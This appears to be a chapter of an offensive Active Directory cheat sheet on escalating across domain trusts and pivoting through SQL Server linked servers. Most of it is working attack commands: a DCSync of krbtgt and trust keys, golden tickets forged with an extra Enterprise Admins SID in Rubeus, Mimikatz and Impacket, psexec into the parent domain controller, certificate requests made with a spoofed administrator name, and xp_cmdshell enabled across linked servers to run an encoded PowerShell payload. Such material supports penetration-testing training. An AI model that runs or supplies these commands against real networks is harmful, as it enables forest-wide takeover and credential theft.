# 10 — Cross-Trust & SQL Server Links


> [!IMPORTANT]
> Cross-trust escalation allows an attacker who achieved Domain Admin in a child domain to compromise the forest root and achieve Enterprise Admin access. SQL Server database links provide cross-forest code execution paths across trust boundaries.

---

## Cross-Trust Attacks

### Attack Methodology
1. **Enumerate domains** (`Get-ForestDomain`)
2. **Enumerate forest** (`Get-ADForest`)
3. **Enumerate trusts** (`Get-DomainTrust` / `Get-ADTrust`)
4. **Identify trust attributes:** Source domain, Target domain, Direction, Trust type, SID filtering status
5. **Get Child Domain SID** (`Get-Domain`)
6. **Get Forest Root / Enterprise Admin SID** (`Get-DomainGroup -Domain <ROOT_DOMAIN> -Identity 'Enterprise Admins'`)
7. **Obtain trust key / krbtgt key** (via `DCSync` on child DC)
8. **Forge Inter-Domain TGT / Golden Ticket with Extra SID**
9. **Inject ticket into session** (`ptt`)
10. **Access forest-root resources** (`\root-dc\C$`)

---

## Child → Parent Forest Root Escalation (SID History)

Within an Active Directory forest, trusts between child and parent domains do not enforce SID filtering by default. Adding the `Enterprise Admins` SID (`-519`) of the forest root domain to an inter-domain TGT grants full Enterprise Admin rights across the entire forest.

### 1. Enumerate Trust & SIDs
```powershell
# Enumerate child domain SID and parent domain SID
Get-DomainSID
(Get-DomainGroup -Domain moneycorp.local -Identity 'Enterprise Admins').objectsid
```

### 2. Extract Trust Key / krbtgt Key via DCSync
```text
# Dump trust key for parent domain or krbtgt key on child DC
lsadump::dcsync /user:dcorp\krbtgt
lsadump::dcsync /user:moneycorp$
```

### 3. Forge Inter-Domain TGT (Rubeus / Mimikatz / Impacket)
```cmd
# Rubeus Inter-Domain Golden Ticket with ExtraSID (Enterprise Admins)
Rubeus.exe golden /aes256:<CHILD_KRBTGT_AES256> /sid:<CHILD_DOMAIN_SID> /sids:<ENTERPRISE_ADMINS_SID> /ldap /user:Administrator /domain:<CHILD_DOMAIN> /ptt

# Mimikatz Golden Ticket across trust
mimikatz # kerberos::golden /user:Administrator /domain:<CHILD_DOMAIN> /sid:<CHILD_DOMAIN_SID> /sids:<ENTERPRISE_ADMINS_SID> /aes256:<CHILD_KRBTGT_AES256> /ptt
```

```bash
# Impacket ticketer cross-trust forgery
impacket-ticketer -nthash <TRUST_KEY_NTLM> -domain-sid <CHILD_SID> -domain <CHILD_DOMAIN> -extra-sid <ENTERPRISE_ADMINS_SID> Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec <CHILD_DOMAIN>/Administrator@<PARENT_DC> -k -no-pass
```

### 4. Verify Access on Parent DC
```powershell
ls \\<PARENT_DC_FQDN>\c$
Enter-PSSession -ComputerName <PARENT_DC_FQDN>
```

---

## AD CS Across Trusts

If an AD CS Certificate Authority is published in a parent domain or forest, users in child/trust domains can request certificates if template enrollment permissions allow.

```cmd
# Request certificate from parent CA specifying parent Admin UPN
Certify.exe request /ca:<PARENT_CA_FQDN>\<CA_NAME> /template:<TEMPLATE> /altname:Administrator@<PARENT_DOMAIN>
```

---

## SQL Server Database Link Exploitation

SQL Server instances frequently have database links configured to communicate with other SQL instances across domain and forest trust boundaries.

### SQL Attack Methodology
1. **Discovery** → Scan domain for SQL instances
2. **Current Login** → Identify current SQL context
3. **Roles & Impersonation** → Check server roles and `IMPERSONATE` permissions
4. **Linked Servers** → Enumerate direct linked SQL servers
5. **Nested Links** → Crawl multi-hop database links
6. **Command Execution** → Enable `xp_cmdshell` via `EXEC (...) AT [LinkedServer]`
7. **Pivot** → Execute code in target domain/forest

---

## PowerUpSQL & Native SQL Query Reference

### 1. Discovery & Instance Scanning
```powershell
# PowerUpSQL: Discover SQL Server instances in domain
Get-SQLInstanceDomain

# PowerUpSQL: Test connectivity to SQL instance
Get-SQLConnectionTest -Instance <SQL_INSTANCE>
```
```sql
-- Native SQL: Check current user and server role
SELECT SUSER_SNAME();
SELECT IS_SRVROLEMEMBER('sysadmin');
```

### 2. Enumerate Linked Servers & Nested Links
```powershell
# PowerUpSQL: Enumerate direct database links
Get-SqlServerLink -Instance <SQL_INSTANCE>

# PowerUpSQL: Crawl nested database links automatically
Get-SqlServerLinkCrawl -Instance <SQL_INSTANCE>
```
```sql
-- Native SQL: Enumerate linked servers
EXEC sp_linkedservers;
SELECT * FROM sys.servers;

-- Native SQL: Check login on linked server
SELECT * FROM OPENQUERY("[LINKED_SERVER]", 'SELECT SUSER_SNAME(); SELECT IS_SRVROLEMEMBER(''sysadmin'');');
```

### 3. Execute OS Commands (xp_cmdshell)
```powershell
# PowerUpSQL: Automated command execution across link chain
Invoke-SQLOSCmd -Instance <SQL_INSTANCE> -Command "whoami" -RawResults
```

```sql
-- Native SQL: Enable xp_cmdshell on local SQL instance
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

-- Native SQL: Enable xp_cmdshell on LINKED SERVER via EXEC AT
EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [LINKED_SERVER];
EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [LINKED_SERVER];
EXEC ('xp_cmdshell ''powershell -e <BASE64_PAYLOAD>'';') AT [LINKED_SERVER];

-- Native SQL: Multi-Hop / Nested Link Command Execution
EXEC ('EXEC (''xp_cmdshell ''''whoami'''';'') AT [LINKED_SERVER_2]') AT [LINKED_SERVER_1];
```
